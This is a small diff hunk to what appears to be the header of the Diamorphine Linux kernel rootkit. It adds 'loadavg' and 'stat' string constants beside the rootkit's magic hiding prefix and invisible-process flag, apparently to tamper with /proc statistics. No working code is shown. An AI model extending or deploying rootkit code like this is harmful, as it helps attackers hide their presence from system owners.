@@ -9,6 +9,8 @@ struct linux_dirent {
 #define END_MEM		ULONG_MAX
 
 #define MAGIC_PREFIX "diamorphine_secret"
+#define LOADAVG "loadavg"
+#define STAT "stat"
 
 #define PF_INVISIBLE 0x10000000
 
